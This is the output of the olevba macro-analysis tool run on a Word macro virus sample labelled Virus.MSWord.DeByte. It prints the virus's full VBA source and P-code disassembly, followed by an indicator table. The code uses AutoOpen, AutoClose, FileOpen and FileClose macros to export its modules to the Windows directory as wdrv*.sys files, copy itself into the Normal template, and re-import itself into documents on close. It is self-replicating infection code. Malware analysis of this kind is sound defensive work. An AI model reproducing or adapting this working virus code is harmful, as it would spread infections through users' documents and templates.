olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.DeByte
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.DeByte - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Dead_Byte.bas 
in file: ./Virus.MSWord.DeByte - OLE stream: 'Macros/VBA/Dead_Byte'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Dead_Byte()
   'http://www.deadbyte.narod.ru
   
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileOpen.bas 
in file: ./Virus.MSWord.DeByte - OLE stream: 'Macros/VBA/FileOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Sub FileOpen()
Dim winda As String
Dim test_normal As Byte
Dim t As Byte

t = 0
Dialogs(wdDialogFileOpen).Show
For Each VbComponent In ActiveDocument.VBProject.VBComponents
    If VbComponent.Name = "Dead_Byte" Then t = 255
Next

If t = 0 Then GoTo ok

test_normal = 0
winda = "                                                                           "
n = GetWindowsDirectory(winda, 255)
winda = Left$(winda, n)

ActiveDocument.VBProject.VBComponents("Dead_Byte").Export winda + "\wdrv1.sys"
ActiveDocument.VBProject.VBComponents("FileOpen").Export winda + "\wdrv2.sys"
ActiveDocument.VBProject.VBComponents("AutoOpen").Export winda + "\wdrv3.sys"
ActiveDocument.VBProject.VBComponents("AutoClose").Export winda + "\wdrv4.sys"
ActiveDocument.VBProject.VBComponents("FileClose").Export winda + "\wdrv5.sys"

For i = 1 To WordBasic.CountMacros(0, 0)
 If WordBasic.[MacroName$](i, 0, 0) = "Dead_Byte" Then test_normal = 255
Next i

If test_normal = 255 Then GoTo ok
WordBasic.MacroCopy WordBasic.[FileName$]() + ":Dead_Byte", "Normal:Dead_Byte"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":FileOpen", "Normal:FileOpen"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":FileClose", "Normal:FileClose"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoClose", "Normal:AutoClose"
ok:
End Sub

-------------------------------------------------------------------------------
VBA MACRO FileClose.bas 
in file: ./Virus.MSWord.DeByte - OLE stream: 'Macros/VBA/Fileclose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Sub FileClose()
Dim vir_test As Byte
Dim winda As String

vir_test = 0
For Each VbComponent In ActiveDocument.VBProject.VBComponents
    If VbComponent.Name = "Dead_Byte" Then vir_test = 255
Next
If vir_test = 255 Then GoTo V_ok

winda = "                                                                           "
n = GetWindowsDirectory(winda, 255)
winda = Left$(winda, n)
ActiveDocument.VBProject.VBComponents.Import winda + "\wdrv1.sys"
ActiveDocument.VBProject.VBComponents.Import winda + "\wdrv2.sys"
ActiveDocument.VBProject.VBComponents.Import winda + "\wdrv3.sys"
ActiveDocument.VBProject.VBComponents.Import winda + "\wdrv4.sys"
ActiveDocument.VBProject.VBComponents.Import winda + "\wdrv5.sys"
ActiveDocument.Save
V_ok:
WordBasic.FileClose
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: ./Virus.MSWord.DeByte - OLE stream: 'Macros/VBA/autoclose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Sub AutoClose()
Dim vir_test As Byte
Dim winda As String

vir_test = 0
For Each VbComponent In ActiveDocument.VBProject.VBComponents
    If VbComponent.Name = "Dead_Byte" Then vir_test = 255
Next
If vir_test = 255 Then GoTo V_ok

winda = "                                                                           "
n = GetWindowsDirectory(winda, 255)
winda = Left$(winda, n)
ActiveDocument.VBProject.VBComponents.Import winda + "\wdrv1.sys"
ActiveDocument.VBProject.VBComponents.Import winda + "\wdrv2.sys"
ActiveDocument.VBProject.VBComponents.Import winda + "\wdrv3.sys"
ActiveDocument.VBProject.VBComponents.Import winda + "\wdrv4.sys"
ActiveDocument.VBProject.VBComponents.Import winda + "\wdrv5.sys"
ActiveDocument.Save
V_ok:
End Sub
-------------------------------------------------------------------------------
VBA MACRO Autoopen.bas 
in file: ./Virus.MSWord.DeByte - OLE stream: 'Macros/VBA/autoopen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long

Sub Autoopen()
Dim winda As String
Dim test_normal As Byte

test_normal = 0
winda = "                                                                           "
n = GetWindowsDirectory(winda, 255)
winda = Left$(winda, n)

ActiveDocument.VBProject.VBComponents("Dead_Byte").Export winda + "\wdrv1.sys"
ActiveDocument.VBProject.VBComponents("FileOpen").Export winda + "\wdrv2.sys"
ActiveDocument.VBProject.VBComponents("Autoopen").Export winda + "\wdrv3.sys"
ActiveDocument.VBProject.VBComponents("AutoClose").Export winda + "\wdrv4.sys"
ActiveDocument.VBProject.VBComponents("FileClose").Export winda + "\wdrv5.sys"

For i = 1 To WordBasic.CountMacros(0, 0)
 If WordBasic.[MacroName$](i, 0, 0) = "Dead_Byte" Then test_normal = 255
Next i

If test_normal = 255 Then GoTo ok
WordBasic.MacroCopy WordBasic.[FileName$]() + ":Dead_Byte", "Normal:Dead_Byte"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":FileOpen", "Normal:FileOpen"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":Fileclose", "Normal:FileClose"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":Autoclose", "Normal:AutoClose"
ok:
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.DeByte
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1182 bytes
' Macros/VBA/Dead_Byte - 906 bytes
' Line #0:
' 	FuncDefn (Sub Dead_Byte())
' Line #1:
' 	QuoteRem 0x0003 0x001C "http://www.deadbyte.narod.ru"
' Line #2:
' Line #3:
' 	EndSub 
' Macros/VBA/FileOpen - 3017 bytes
' Line #0:
' 	FuncDefn (Private Declare Function GetWindowsDirectory Lib "kernel32" (ByVal lpBuffer As String, ByVal nSize As Long) As Long)
' Line #1:
' 	FuncDefn (Sub FileOpen())
' Line #2:
' 	Dim 
' 	VarDefn winda (As String)
' Line #3:
' 	Dim 
' 	VarDefn test_normal (As Byte)
' Line #4:
' 	Dim 
' 	VarDefn t (As Byte)
' Line #5:
' Line #6:
' 	LitDI2 0x0000 
' 	St t 
' Line #7:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #8:
' 	StartForVariable 
' 	Ld VbComponent 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #9:
' 	Ld VbComponent 
' 	MemLd New 
' 	LitStr 0x0009 "Dead_Byte"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x00FF 
' 	St t 
' 	EndIf 
' Line #10:
' 	StartForVariable 
' 	Next 
' Line #11:
' Line #12:
' 	Ld t 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo ok 
' 	EndIf 
' Line #13:
' Line #14:
' 	LitDI2 0x0000 
' 	St test_normal 
' Line #15:
' 	LitStr 0x004B "                                                                           "
' 	St winda 
' Line #16:
' 	Ld winda 
' 	LitDI2 0x00FF 
' 	ArgsLd GetWindowsDirectory 0x0002 
' 	St n 
' Line #17:
' 	Ld winda 
' 	Ld n 
' 	ArgsLd LBound$ 0x0002 
' 	St winda 
' Line #18:
' Line #19:
' 	Ld winda 
' 	LitStr 0x000A "\wdrv1.sys"
' 	Add 
' 	LitStr 0x0009 "Dead_Byte"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #20:
' 	Ld winda 
' 	LitStr 0x000A "\wdrv2.sys"
' 	Add 
' 	LitStr 0x0008 "FileOpen"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #21:
' 	Ld winda 
' 	LitStr 0x000A "\wdrv3.sys"
' 	Add 
' 	LitStr 0x0008 "AutoOpen"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #22:
' 	Ld winda 
' 	LitStr 0x000A "\wdrv4.sys"
' 	Add 
' 	LitStr 0x0009 "AutoClose"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #23:
' 	Ld winda 
' 	LitStr 0x000A "\wdrv5.sys"
' 	Add 
' 	LitStr 0x0009 "FileClose"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #24:
' Line #25:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0002 
' 	For 
' Line #26:
' 	Ld i 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0003 
' 	LitStr 0x0009 "Dead_Byte"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x00FF 
' 	St test_normal 
' 	EndIf 
' Line #27:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #28:
' Line #29:
' 	Ld test_normal 
' 	LitDI2 0x00FF 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo ok 
' 	EndIf 
' Line #30:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x000A ":Dead_Byte"
' 	Add 
' 	LitStr 0x0010 "Normal:Dead_Byte"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #31:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0009 ":FileOpen"
' 	Add 
' 	LitStr 0x000F "Normal:FileOpen"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #32:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x000A ":FileClose"
' 	Add 
' 	LitStr 0x0010 "Normal:FileClose"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #33:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x000A ":AutoClose"
' 	Add 
' 	LitStr 0x0010 "Normal:AutoClose"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #34:
' 	Label ok 
' Line #35:
' 	EndSub 
' Line #36:
' Macros/VBA/Fileclose - 2182 bytes
' Line #0:
' 	FuncDefn (Private Declare Function GetWindowsDirectory Lib "kernel32" (ByVal lpBuffer As String, ByVal nSize As Long) As Long)
' Line #1:
' 	FuncDefn (Sub FileClose())
' Line #2:
' 	Dim 
' 	VarDefn vir_test (As Byte)
' Line #3:
' 	Dim 
' 	VarDefn winda (As String)
' Line #4:
' Line #5:
' 	LitDI2 0x0000 
' 	St vir_test 
' Line #6:
' 	StartForVariable 
' 	Ld VbComponent 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #7:
' 	Ld VbComponent 
' 	MemLd New 
' 	LitStr 0x0009 "Dead_Byte"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x00FF 
' 	St vir_test 
' 	EndIf 
' Line #8:
' 	StartForVariable 
' 	Next 
' Line #9:
' 	Ld vir_test 
' 	LitDI2 0x00FF 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo V_ok 
' 	EndIf 
' Line #10:
' Line #11:
' 	LitStr 0x004B "                                                                           "
' 	St winda 
' Line #12:
' 	Ld winda 
' 	LitDI2 0x00FF 
' 	ArgsLd GetWindowsDirectory 0x0002 
' 	St n 
' Line #13:
' 	Ld winda 
' 	Ld n 
' 	ArgsLd LBound$ 0x0002 
' 	St winda 
' Line #14:
' 	Ld winda 
' 	LitStr 0x000A "\wdrv1.sys"
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #15:
' 	Ld winda 
' 	LitStr 0x000A "\wdrv2.sys"
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #16:
' 	Ld winda 
' 	LitStr 0x000A "\wdrv3.sys"
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #17:
' 	Ld winda 
' 	LitStr 0x000A "\wdrv4.sys"
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #18:
' 	Ld winda 
' 	LitStr 0x000A "\wdrv5.sys"
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #19:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #20:
' 	Label V_ok 
' Line #21:
' 	Ld WordBasic 
' 	ArgsMemCall FileClose 0x0000 
' Line #22:
' 	EndSub 
' Macros/VBA/autoclose - 2141 bytes
' Line #0:
' 	FuncDefn (Private Declare Function GetWindowsDirectory Lib "kernel32" (ByVal lpBuffer As String, ByVal nSize As Long) As Long)
' Line #1:
' 	FuncDefn (Sub AutoClose())
' Line #2:
' 	Dim 
' 	VarDefn vir_test (As Byte)
' Line #3:
' 	Dim 
' 	VarDefn winda (As String)
' Line #4:
' Line #5:
' 	LitDI2 0x0000 
' 	St vir_test 
' Line #6:
' 	StartForVariable 
' 	Ld VbComponent 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #7:
' 	Ld VbComponent 
' 	MemLd New 
' 	LitStr 0x0009 "Dead_Byte"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x00FF 
' 	St vir_test 
' 	EndIf 
' Line #8:
' 	StartForVariable 
' 	Next 
' Line #9:
' 	Ld vir_test 
' 	LitDI2 0x00FF 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo V_ok 
' 	EndIf 
' Line #10:
' Line #11:
' 	LitStr 0x004B "                                                                           "
' 	St winda 
' Line #12:
' 	Ld winda 
' 	LitDI2 0x00FF 
' 	ArgsLd GetWindowsDirectory 0x0002 
' 	St n 
' Line #13:
' 	Ld winda 
' 	Ld n 
' 	ArgsLd LBound$ 0x0002 
' 	St winda 
' Line #14:
' 	Ld winda 
' 	LitStr 0x000A "\wdrv1.sys"
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #15:
' 	Ld winda 
' 	LitStr 0x000A "\wdrv2.sys"
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #16:
' 	Ld winda 
' 	LitStr 0x000A "\wdrv3.sys"
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #17:
' 	Ld winda 
' 	LitStr 0x000A "\wdrv4.sys"
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #18:
' 	Ld winda 
' 	LitStr 0x000A "\wdrv5.sys"
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #19:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #20:
' 	Label V_ok 
' Line #21:
' 	EndSub 
' Macros/VBA/autoopen - 2673 bytes
' Line #0:
' 	FuncDefn (Private Declare Function GetWindowsDirectory Lib "kernel32" (ByVal lpBuffer As String, ByVal nSize As Long) As Long)
' Line #1:
' Line #2:
' 	FuncDefn (Sub Autoopen())
' Line #3:
' 	Dim 
' 	VarDefn winda (As String)
' Line #4:
' 	Dim 
' 	VarDefn test_normal (As Byte)
' Line #5:
' Line #6:
' 	LitDI2 0x0000 
' 	St test_normal 
' Line #7:
' 	LitStr 0x004B "                                                                           "
' 	St winda 
' Line #8:
' 	Ld winda 
' 	LitDI2 0x00FF 
' 	ArgsLd GetWindowsDirectory 0x0002 
' 	St n 
' Line #9:
' 	Ld winda 
' 	Ld n 
' 	ArgsLd LBound$ 0x0002 
' 	St winda 
' Line #10:
' Line #11:
' 	Ld winda 
' 	LitStr 0x000A "\wdrv1.sys"
' 	Add 
' 	LitStr 0x0009 "Dead_Byte"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #12:
' 	Ld winda 
' 	LitStr 0x000A "\wdrv2.sys"
' 	Add 
' 	LitStr 0x0008 "FileOpen"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #13:
' 	Ld winda 
' 	LitStr 0x000A "\wdrv3.sys"
' 	Add 
' 	LitStr 0x0008 "Autoopen"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #14:
' 	Ld winda 
' 	LitStr 0x000A "\wdrv4.sys"
' 	Add 
' 	LitStr 0x0009 "AutoClose"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #15:
' 	Ld winda 
' 	LitStr 0x000A "\wdrv5.sys"
' 	Add 
' 	LitStr 0x0009 "FileClose"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #16:
' Line #17:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0002 
' 	For 
' Line #18:
' 	Ld i 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0003 
' 	LitStr 0x0009 "Dead_Byte"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x00FF 
' 	St test_normal 
' 	EndIf 
' Line #19:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #20:
' Line #21:
' 	Ld test_normal 
' 	LitDI2 0x00FF 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo ok 
' 	EndIf 
' Line #22:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x000A ":Dead_Byte"
' 	Add 
' 	LitStr 0x0010 "Normal:Dead_Byte"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #23:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0009 ":FileOpen"
' 	Add 
' 	LitStr 0x000F "Normal:FileOpen"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #24:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x000A ":Fileclose"
' 	Add 
' 	LitStr 0x0010 "Normal:FileClose"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #25:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x000A ":Autoclose"
' 	Add 
' 	LitStr 0x0010 "Normal:AutoClose"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #26:
' 	Label ok 
' Line #27:
' 	EndSub 
' Line #28:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.deadbyte.|URL                                          |
|          |narod.ru            |                                             |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

